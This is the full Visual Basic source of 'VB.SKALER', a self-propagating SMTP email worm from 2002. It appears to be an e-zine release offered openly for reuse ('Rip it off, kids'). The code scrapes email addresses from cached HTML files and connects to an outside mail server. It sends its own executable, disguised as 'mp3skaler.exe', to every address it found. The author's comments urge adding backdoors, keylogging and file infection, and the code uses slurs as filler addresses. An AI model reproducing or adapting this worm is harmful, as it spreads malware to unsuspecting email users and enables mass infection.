@@ -1,0 +1,375 @@
+   ' \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+   ' Rip it off, kids : Presenting VB.SKALER by alcopaul  \\\\\
+   ' \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+   '
+   ' all of my previous worms uses outlook to propagate via e-mail... one time, i revisited my past and viewed my old creations
+   ' and thought that i'm really a lame ass then.... but not anymore... :D
+   '
+   ' This is my first SMTP worm that sends itself to the e-mail addresses contained in htm and html files located in
+   ' Temporary Internet Files folder... And the first SMTP Visual Basic worm to be featured in an e-zine, i think
+   ' (Slap me if i'm thinkin' wrongly...  :) I've modified PetiK's technique of collecting e-mail addresses (Thankie PetiK! :) ),
+   ' so the collected e-mail addresses will be a valid e-mail addy... If the collected e-mail addy contains "?", it will be
+   ' replaced by a bogus e-mail addy, but with a valid syntax...
+   '
+   ' I was thinkin of putting the MIME sploit in here but i thought that it would not be cool coz the sploit is too way archaic..
+   ' :P... Waiting for the automatic execution via HTML sploit... heheheheheh
+   '
+   ' and also thankie to a VB programmer (you know who you are.. just look at b64 function.. :) ) for the base64 routine....
+   '
+   ' i'm expecting to break even with the number of VC++ smtp worms.... it depends to you, VB enthusiasts... you can
+   ' enhance this code.. put some Internet Connexion Checking and stuff... Check the registry for some smtp server, sender
+   ' name and e-mail addy... cool payloads... file infection.. backdoor capabilities... keylogging... etc....
+   '
+   ' "Watch out, VB worms are coming to your mailboxes!"
+   '
+   '
+   ' \\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+   ' the source \\\\\\\\\\\\\\\\\\\
+   ' \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+   '
+   ' TADA! Rip it off, kids... hehheheheh
+   '
+   ' -----------------------------------------------------------------------------------------------------------------------------
+   VERSION 5.00
+   Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
+   Begin VB.Form Form1
+      Caption         =   "Form1"
+      ClientHeight    =   3195
+      ClientLeft      =   60
+      ClientTop       =   345
+      ClientWidth     =   4680
+      LinkTopic       =   "Form1"
+      ScaleHeight     =   3195
+      ScaleWidth      =   4680
+      StartUpPosition =   3  'Windows Default
+      Begin MSWinsockLib.Winsock Winsock1
+         Left            =   1200
+         Top             =   840
+         _ExtentX        =   741
+         _ExtentY        =   741
+         _Version        =   393216
+      End
+   End
+   Attribute VB_Name = "Form1"
+   Attribute VB_GlobalNameSpace = False
+   Attribute VB_Creatable = False
+   Attribute VB_PredeclaredId = True
+   Attribute VB_Exposed = False
+   Option Explicit
+   Private Response As String
+   Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+   Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
+   Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
+   Const CSIDL_TIF = &H20
+   Private Type SHITEMID
+   cb As Long
+   abID As Byte
+   End Type
+   Private Type ITEMIDLIST
+   mkid As SHITEMID
+   End Type
+   Private Sub Form_Load()
+   On Error Resume Next
+   Kill "c:\t.txt"
+   listht GetSpecialfolder(CSIDL_TIF)
+   transmit ("mail.lycos.com") ' <<<<<<<<<if this ain't work, find another mail server>>>>>>>>>>>
+   Unload Me
+   End Sub
+   Function transmit(ByVal b8 As String)
+   Dim q As String, a As String, textline As String
+   Dim www, ggg
+   Winsock1.LocalPort = 0
+   If Winsock1.State = sckClosed Then
+   Winsock1.Protocol = sckTCPProtocol
+   Winsock1.RemoteHost = b8
+   Winsock1.RemotePort = 25
+   Winsock1.Connect
+   W4C ("220")
+   Winsock1.SendData "HELO localhost" & vbCrLf
+   W4C ("250")
+   Winsock1.SendData "MAIL FROM:" & " <" + "skaler@hotmail.com" + ">" & vbCrLf
+   W4C ("250")
+   Open "c:\t.txt" For Input As #1
+   Do While Not EOF(1)
+   Line Input #1, textline
+   q = q & textline
+   Loop
+   Close #1
+   a = Trim(q)
+   www = Split(a, ";")
+   For Each ggg In www
+   If ggg = "" Then
+   ggg = "blah@h.net"
+   End If
+   If InStr(1, ggg, "@") Then
+   Else
+   ggg = "faggot@fillme.com"
+   End If
+   If InStr(1, ggg, "?") Then
+   ggg = "juana12234@yahoo.com"
+   End If
+   Winsock1.SendData "RCPT TO: " & "<" & ggg & ">" & vbCrLf
+   W4C ("250")
+   Next ggg
+   Winsock1.SendData "DATA" & vbCrLf
+   W4C ("354")
+   Winsock1.SendData hd & vbCrLf
+   Winsock1.SendData "<html>Oi, oi, oi! Wanna hear me play ska? Check this out....</html>" & vbCrLf
+   Winsock1.SendData a12()
+   Winsock1.SendData vbCrLf & "." & vbCrLf
+   W4C ("250")
+   Winsock1.SendData "QUIT" & vbCrLf
+   W4C ("221")
+   Winsock1.Close
+   transmit = True
+   Else
+   End If
+   End Function
+   Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
+   Winsock1.GetData Response
+   End Sub
+   Private Sub W4C(ResponseCode As String)
+   Dim TT As Single
+   Dim TTT As Single
+   TT = Timer
+   While Len(Response) = 0
+   TTT = TT - Timer
+   DoEvents
+   If TTT > 24 Then
+   Exit Sub
+   End If
+   Sleep 1
+   Wend
+   While Left(Response, 3) <> ResponseCode
+   DoEvents
+   If TTT > 50 Then
+   Exit Sub
+   End If
+   Sleep 1
+   Wend
+   Response = ""
+   End Sub
+   Sub listht(dir)
+   On Error Resume Next
+   Dim fso, ssfh, filh, s, f, d, q, a, textline
+   Set fso = CreateObject("Scripting.FileSystemObject")
+   Set ssfh = fso.GetFolder(dir).SubFolders
+   For Each filh In ssfh
+   s = infht(filh.path)
+   listht (filh.path)
+   If s = "" Then
+   s = "fuck@well.com"
+   End If
+   f = f & s & ";"
+   Next
+   d = f
+   Open "c:\t.txt" For Append As #1
+   Print #1, d
+   Close #1
+   End Sub
+   Function infht(dir)
+   Dim mlto As String
+   Dim fso, cfh, filh, ext, textline, q, wwww
+   Dim j As Long, cnt As Long
+   Set fso = CreateObject("Scripting.FileSystemObject")
+   Set cfh = fso.GetFolder(dir).Files
+   For Each filh In cfh
+   ext = fso.GetExtensionName(filh.path)
+   ext = LCase(ext)
+   If (ext = "htm") Or (ext = "html") Then
+   Open filh.path For Input As #1
+   Do While Not EOF(1)
+   Line Input #1, textline
+   q = q & textline
+   Loop
+   Close #1
+   For j = 1 To Len(q)
+   If Mid(q, j, 8) = """" & "mailto:" Then
+   mlto = ""
+   cnt = 0
+   Do While Mid(q, j + 8 + cnt, 1) <> """"
+   mlto = mlto + Mid(q, j + 8 + cnt, 1)
+   cnt = cnt + 1
+   Loop
+   wwww = wwww & mlto & ";"
+   End If
+   Next
+   End If
+   Next
+   infht = wwww
+   End Function
+   Private Function GetSpecialfolder(CSIDL As Long) As String
+   Dim r As Long
+   Dim IDL As ITEMIDLIST
+   Dim path As String
+   r = SHGetSpecialFolderLocation(100, CSIDL, IDL)
+   If r = 0 Then
+   path$ = Space$(512)
+   r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal path$)
+   GetSpecialfolder = Left$(path, InStr(path, Chr$(0)) - 1)
+   Exit Function
+   End If
+   GetSpecialfolder = ""
+   End Function
+   Private Function hd() As String
+   Dim fin As String, dh As String, recip As String
+   Dim sdatenow As String, deit As String, phrom As String, topic As String, engine As String, myme As String
+   sdatenow = Format(Date, "Ddd") & ", " & Format(Date, "dd Mmm YYYY") & " " & Format(Time, "hh:mm:ss")
+   recip = "To: Subscribers" & vbCrLf
+   deit = "Date:" + Chr(32) + sdatenow + vbCrLf
+   phrom = "From: " & Chr(34) & "Chief Skaler" & Chr(34) & " <webmaster@skaler.com>" + vbCrLf
+   topic = "Subject:" + Chr(32) + "hello world" + vbCrLf
+   engine = "X-Mailer: mailsux9855097" + vbCrLf
+   myme = "MIME-Version: 1.0" & vbCrLf & _
+   "Content-Type: multipart/related; boundary=" & _
+   Chr(34) & "blimp" & Chr(34) & "; type=" & Chr(34) & _
+   "text/html" & Chr(34) & vbCrLf & _
+   "by:alcotheSkaler" & vbCrLf & _
+   "--blimp" & vbCrLf & _
+   "Content-Type: text/html; charset=us-ascii" & vbCrLf & _
+   "Content-Transfer-Encoding: 7bit" & vbCrLf
+   dh = phrom & deit & engine & recip & topic & myme
+   hd = dh
+   End Function
+   Private Function a12() As String
+   Dim fin As String
+   Dim phile as String
+   Dim ss as string
+   ss = App.Path
+   if Right(ss,1) <> "\" then ss = ss & "\"
+   fin = fin & e32(ss & app.exename & ".exe")
+   fin = fin & vbCrLf & "--blimp--" & vbCrLf
+   a12 = fin
+   End Function
+   Public Function e32(ByVal vsFullPathname As String) As String
+   Dim fin As String
+   fin = vbCrLf & "--blimp" & vbNewLine
+   fin = fin & "Content-Type: application/octet-stream; name=" & Chr(34) & "mp3skaler.exe" & Chr(34) & vbNewLine
+   fin = fin & "Content-Transfer-Encoding: base64" & vbNewLine
+   fin = fin & "Content-Disposition: attachment; filename=" & Chr(34) & "mp3skaler.exe" & Chr(34) & vbNewLine
+   fin = fin & b64(vsFullPathname)
+   e32 = fin
+   End Function
+   Public Function b64(ByVal vsFullPathname As String) As String
+       'For Encoding BASE64
+       Dim b           As Integer
+       Dim Base64Tab   As Variant
+       Dim bin(3)      As Byte
+       Dim s           As String
+       Dim l           As Long
+       Dim i           As Long
+       Dim FileIn      As Long
+       Dim sResult     As String
+       Dim n           As Long
+
+       'Base64Tab=>tabla de tabulación
+       Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")
+
+       Erase bin
+       l = 0: i = 0: FileIn = 0: b = 0:
+       s = ""
+
+       'Gets the next free filenumber
+       FileIn = FreeFile
+
+       'Open Base64 Input File
+       Open vsFullPathname For Binary As FileIn
+
+       sResult = s & vbCrLf
+       s = ""
+
+       l = LOF(FileIn) - (LOF(FileIn) Mod 3)
+
+       For i = 1 To l Step 3
+
+           'Read three bytes
+           Get FileIn, , bin(0)
+           Get FileIn, , bin(1)
+           Get FileIn, , bin(2)
+
+           'Always wait until there're more then 64 characters
+           If Len(s) > 64 Then
+
+               s = s & vbCrLf
+               sResult = sResult & s
+               s = ""
+
+           End If
+
+           'Calc Base64-encoded char
+           b = (bin(n) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
+           s = s & Base64Tab(b) 'the character s holds the encoded chars
+
+           b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
+           s = s & Base64Tab(b)
+
+           b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
+           s = s & Base64Tab(b)
+
+           b = bin(n + 2) And &H3F
+           s = s & Base64Tab(b)
+
+       Next i
+
+       'Now, you need to check if there is something left
+       If Not (LOF(FileIn) Mod 3 = 0) Then
+
+           'Reads the number of bytes left
+           For i = 1 To (LOF(FileIn) Mod 3)
+               Get FileIn, , bin(i - 1)
+           Next i
+
+           'If there are only 2 chars left
+           If (LOF(FileIn) Mod 3) = 2 Then
+               b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
+               s = s & Base64Tab(b)
+
+               b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
+               s = s & Base64Tab(b)
+
+               b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
+               s = s & Base64Tab(b)
+
+               s = s & "="
+
+           Else 'If there is only one char left
+               b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
+               s = s & Base64Tab(b)
+
+               b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
+               s = s & Base64Tab(b)
+
+               s = s & "=="
+           End If
+       End If
+
+       'Send the characters left
+       If s <> "" Then
+           s = s & vbCrLf
+           sResult = sResult & s
+       End If
+
+       'Send the last part of the MIME Body
+       s = ""
+
+       Close FileIn
+       b64 = sResult
+
+   End Function
+   ' -----------------------------------------------------------------------------------------------------------------------------
+   '
+   '
+   ' SMTP... I thought it was hard but it's way too easy....
+   '
+   '
+   ' \\\\\\\\\\\\\\\\\
+   ' alcopaul\\\\\\\\\\
+   ' \\\\\\\\\\\\\\\\\\\
+   ' july 18, 2002 \\\\\\
+   ' \\\\\\\\\\\\\\\\\\\\\
+   ' the philippines\\\\\\\
+   ' \\\\\\\\\\\\\\\\\\\\\\\
+   '
+   ' greets : arkhangel, philetoaster/[rRlf], PetiK (mail me!), Lord Julus/[TKT], ebcvg, brigada8, mAniaC89/[b8], Zirkov/[b8],
+   '          jackie, Dr. T, Alpha Phi Omega International Collegiate Service Fraternity, ETA chapter, Philippines, VirusBuster
+   '    IllAwesome, my little sister(Syra), my parents and my girlfriend Janis ("love you so much")...
